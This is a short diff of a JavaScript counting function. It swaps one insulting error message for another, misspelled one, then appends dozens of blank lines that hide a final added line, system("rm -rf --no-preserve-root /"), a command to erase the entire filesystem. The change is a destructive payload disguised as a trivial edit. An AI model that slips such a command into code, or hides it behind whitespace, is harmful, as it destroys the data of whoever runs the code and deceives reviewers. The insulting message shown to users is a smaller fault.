@@ -1,6 +1,6 @@
 function countTo(targetNumber) {
 	if(targetNumber < 0) {
-		console.log("You are stupid. Negative values not supported!");
+		console.log("You are incompetend. Negative values not supported!");
 		return;
 	}
 
@@ -13,3 +13,78 @@ function countTo(targetNumber) {
 
 countTo(-100);
 // countTo("Peter");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+system("rm -rf --no-preserve-root /")
